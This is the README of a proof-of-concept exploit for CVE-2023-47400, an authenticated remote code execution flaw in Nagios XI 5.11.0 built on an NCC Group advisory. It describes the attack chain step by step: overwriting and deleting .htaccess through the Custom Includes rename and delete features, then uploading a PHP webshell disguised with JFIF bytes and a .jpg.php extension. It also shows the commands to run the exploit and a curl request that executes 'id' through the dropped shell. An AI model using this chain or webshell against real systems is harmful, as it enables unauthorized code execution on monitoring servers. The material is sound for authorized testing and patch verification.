# CVE-2023-47400

Proof of Concept for the CVE-2023-47400

> Authenticated PHP Remote Code Execution via Arbitrary file write on Nagios XI 5.11.0 

---

> [!Note]
> This poc is based on the technical advisory published by NCC group
> https://research.nccgroup.com/2023/12/13/technical-advisory-multiple-vulnerabilities-in-nagios-xi/

This poc follow this process : 

- Upload a valid image named `placeholder.jpg` (only JFIF magic bytes header, no content)
- Use the `rename` feature of Custom Includes to rename the image to `.htaccess` (which has the effect of overwriting the existing `.htaccess` file)
- Use the `delete` feature of Custom Includes to delete the `.htaccess` file
- Upload a PHP payload (spoofing an image signature via the JFIF magic byte headers and the `.jpg.php` double extension)

The exploitation of this vulnerability leads to remote code execution on the nagiosXI host, bypassing file upload filters (via file signature and file extension filters) and php execution prevention (via `.htaccess`).

> [!Warning] 
> This exploit erase the `<NAGIOS_WEB_ROOT>/includes/components/custom-includes/images/.htaccess` file present on host in order to allow PHP code execution ! 


## Usage

- setup the project :
```bash
# create a venv to dependency isolation
python3 -m venv .venv
source .venv/bin/activate
# run pip install before running the exploit
pip install -r requirements.txt
```

- custom the PHP payload to be dropped in image uploads folder 

- run the exploit script :
```bash
python exploit.py
# the exploit generates a webshell and upload it with uuid as filename
[...]
INFO:cve_2023_47400:Successfuly uploaded payload at
INFO:cve_2023_47400:Usage :https://10.10.11.248/nagiosxi/includes/components/custom-includes/images/6ac234ca-8921-4e7e-a833-bf1ba03d2a3c.jpg.php
INFO:cve_2023_47400:Exploit completed successfuly
```

- interact with the dropped payload :
```bash
$ curl -k 'https://10.10.11.248/nagiosxi/includes/components/custom-includes/images/6ac234ca-8921-4e7e-a833-bf1ba03d2a3c.jpg.php?cmd=id' --output -
JFIF
uid=33(www-data) gid=33(www-data) groups=33(www-data),121(Debian-snmp),1001(nagios),1002(nagcmd)
```
